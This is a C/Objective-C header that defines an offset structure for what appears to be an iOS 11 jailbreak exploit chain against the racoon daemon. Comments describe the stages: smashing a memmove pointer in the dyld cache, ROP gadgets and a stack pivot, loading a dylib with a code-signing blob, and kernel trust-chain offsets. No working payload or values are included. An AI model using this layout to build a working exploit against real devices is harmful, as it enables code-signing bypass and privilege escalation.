#include <unistd.h>
#include "rop.h"

#import <Foundation/Foundation.h>

#ifndef COMMON_H
#define COMMON_H

#ifdef __LP64__
#define ADDR "0x%llx"
    typedef uint64_t kptr_t;
#else
#define ADDR "0x%x"
    typedef uint32_t kptr_t;
#endif

#ifdef LOG
#undef LOG
#endif

#ifdef RELEASE
#   define LOG(str, args...) do { } while(0)
#else
#   define LOG(str, args...) do { NSLog(@ str "\n", ##args); } while(0)
#endif

struct offset_struct {
	// stage 1
	int dns4_array_to_lcconf; // distance between the first array element and the lcconf pointer in __DATA of racoon
	uint32_t str_buff_offset; // offset inside of the string buffer (this is where the x21 gadget loads from)
	uint32_t max_slide; // maximum slide of the dyld cache
	uint32_t slide_value; // steps in which the cache gets slid
	uint64_t pivot_x21; // the x21 gadget (see rop.h)
	uint64_t pivot_x21_x9_offset; // fixup because we have to use another gadget on 11.3 and 11.4
	uint64_t memmove; // address of the memmove pointer we smash in the dyld cache data
	uint64_t lcconf_counter_offset; // offset of counter in the lcconf struct
	uint64_t cache_text_seg_size; // size of the dyld cache text segment
	uint64_t new_cache_addr; // the new text address of the cache
	// framework (for stage 2)
	uint64_t BEAST_GADGET; // siguzas gadget (see rop.h)
	uint64_t BEAST_GADGET_LOADER; // everything after the blr
	uint64_t BEAST_GADGET_CALL_ONLY; // everything after and including the blr
	uint64_t str_x0_gadget; // see rop.h (stores x0 somewhere)
	uint64_t str_x0_gadget_offset; // offset of the store
	uint64_t cbz_x0_gadget; // see rop.h
	uint64_t cbz_x0_x16_load; // offset which needs to be overwritten to make the cbz gadget work
	uint64_t add_x0_gadget; // see rop.h
	uint64_t rop_nop; // simple ret
	uint64_t errno_offset; // the offset where the c_nocancel stub will write to
	uint64_t mach_msg_offset; // the offset mach_msg will use and is crashing when it's not mapped, idk how to find that one yet
	// userland functions
	uint64_t longjmp; // _longjmp func
	uint64_t stack_pivot; // _longjmp from mov sp, x2
	uint64_t open; // open func
	uint64_t mmap; // __mmap func
	uint64_t memcpy; // memcpy func
	uint64_t fcntl_raw_syscall; // the raw syscall stub of fcntl
	uint64_t raw_mach_vm_remap_call; // raw syscall stub for mach_vm_remap
	// kernel
	uint64_t ipr_size; // ipr_size offset
	uint64_t trust_chain_head_ptr;
	uint64_t copyin;
	uint64_t gadget_add_x0_x0_ret;
	uint64_t rootdomainUC_vtab;
	uint64_t swapprefix_addr;
	uint64_t itk_registered;
	uint64_t is_task;
	// internal
	rop_gadget_t * stage1_ropchain; 
	rop_gadget_t * stage2_ropchain;
	uint64_t stage2_base; // address where stage 2 gets mapped
	uint64_t stage2_size; // size of stage 2 (also needed for stage 1)
	uint64_t stage2_max_size; // maximum size of stage 2
	uint64_t thread_max_size; // maximum size of one of the threads in stage 2
	void * stage2_databuffer; 
	uint64_t stage2_databuffer_len; // size of the stage 2 data buffer
	uint64_t stage3_jumpaddr; // jump address for the dylib
	uint64_t stage3_fileoffset; // file offset in the dylib
	uint64_t stage3_size; // file size of the dylib	
	uint64_t stage3_loadaddr; // load address for the dylib in the racoon process
	uint64_t stage3_CS_blob; // file offset of the CS blob
	uint64_t stage3_CS_blob_size; // size of that blob
};
typedef struct offset_struct offset_struct_t;

#endif
